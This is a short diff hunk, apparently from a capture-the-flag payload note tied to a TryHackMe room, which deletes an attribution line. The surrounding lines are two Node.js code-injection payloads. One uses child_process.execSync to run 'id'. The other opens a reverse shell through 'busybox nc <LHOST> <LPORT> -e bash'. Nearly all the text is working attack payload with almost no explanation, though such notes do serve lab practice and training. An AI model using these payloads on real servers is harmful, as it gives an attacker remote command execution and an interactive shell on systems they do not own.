@@ -11,4 +11,3 @@ exec (process.mainModule.require('child_process').execSync('id').toString())
 exec (process.mainModule.require('child_process').execSync('busybox nc <LHOST> <LPORT> -e bash').toString())
 ```
 
-— TryHackMe / Do Not Disturb
